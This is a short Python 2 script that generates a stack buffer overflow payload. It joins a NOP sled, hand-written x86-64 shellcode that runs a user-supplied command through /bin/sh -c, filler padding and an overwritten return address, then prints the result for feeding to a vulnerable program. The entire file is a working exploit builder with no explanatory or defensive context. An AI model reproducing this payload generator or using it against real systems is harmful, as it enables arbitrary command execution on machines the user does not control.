#! /usr/bin/python2
import sys


if len(sys.argv)==4:
	address=sys.argv[1].decode("hex")
	address=address[::-1]
	padding_size = int(sys.argv[2])
	toexec=sys.argv[3]

else:
	print "Usage:", sys.argv[0], "address padding_size  command" 
	sys.exit(1)

command_hex = ""
command_size = 0
for c in toexec:
	command_hex += c.encode('hex')
	command_size+=1

shellcode_1="\x48\x31\xc9\x51\x48\xb9\xff\x2f\x62\x69\x6e\x2f" \
+ "\x73\x68\x48\xc1\xe9\x08\x51\x54\x5f\x48\x31\xc9\x51\x66" \
+ "\x68\x2d\x63\x54\x5b\x48\x31\xc9\x51\xeb\x11\x5a\x52\x80" \
+ "\x72"

shellcode_2=(str(command_size/16) + str(hex(command_size % 16)[2:])).decode('hex')

shellcode_3="\x41\x53\x57\x54\x5e\x48\x31\xd2\xb0\x3b\x0f\x05" \
+ "\xe8\xea\xff\xff\xff"

nop_size = 20

padding_size = padding_size - 60 - command_size- len(address) - nop_size

command_hex += "41"
command_hex = command_hex.decode('hex')

shellcode = shellcode_1 + shellcode_2 + shellcode_3 + command_hex

print "\x90" * nop_size + shellcode + "A" * (padding_size) + address
